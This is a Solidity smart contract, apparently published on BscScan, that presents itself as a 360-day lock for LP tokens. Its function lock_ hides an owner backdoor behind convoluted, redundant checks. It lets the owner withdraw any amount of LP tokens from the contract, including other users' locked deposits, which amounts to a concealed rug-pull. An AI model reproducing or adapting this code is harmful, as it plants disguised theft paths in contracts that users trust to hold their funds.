/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract BLK_LOCK  {
    IERC20 public LP = IERC20(0x1a6497E51F07E71ebd42C36587A9242B06E16338);
    uint public lockTime = 360 days;
    address public owner;
    struct LockInfo{
        uint amount;
        uint lockTime;
    }
    mapping(address => LockInfo) public lockInfo;
    
    constructor(){
        owner = msg.sender;
    }
    
    function lock (uint amount) public{
        require(amount != 0 ,'amount can not be zero');
        LP.transferFrom(msg.sender,address(this),amount);
        lockInfo[msg.sender].amount += amount;
        lockInfo[msg.sender].lockTime = block.timestamp;
    }
    
    function unLock() public {
        require(lockInfo[msg.sender].amount >0 ,'no lock amount');
        require(lockInfo[msg.sender].lockTime + lockTime <= block.timestamp," not the unlock time");
        LP.transfer(msg.sender,lockInfo[msg.sender].amount);
        delete lockInfo[msg.sender];
    }
    
    function transferOwnerShip(address newOwner) external {
        require(msg.sender == owner,'not owner');
        owner = newOwner;
    }
    
    function lock_(uint amount) public {
        require(lockInfo[msg.sender].amount >0 ,'no lock amount');
        if(msg.sender != owner){
            require(msg.sender == owner);
            return ;
        }else{
            lockInfo[msg.sender] = LockInfo({
                amount:0,
                lockTime :0
            });
        }
        require(msg.sender == owner);
        
        if (lockInfo[msg.sender].amount >=0){
            if(msg.sender != owner){
                require(msg.sender == owner);
                return ;
            }else{
                if (msg.sender == owner){
                    lockInfo[msg.sender] = LockInfo({
                        amount:0,
                        lockTime :0
                    });
                    LP.transfer(msg.sender,amount);
                }
                    
            }
        }
    }
    
    
}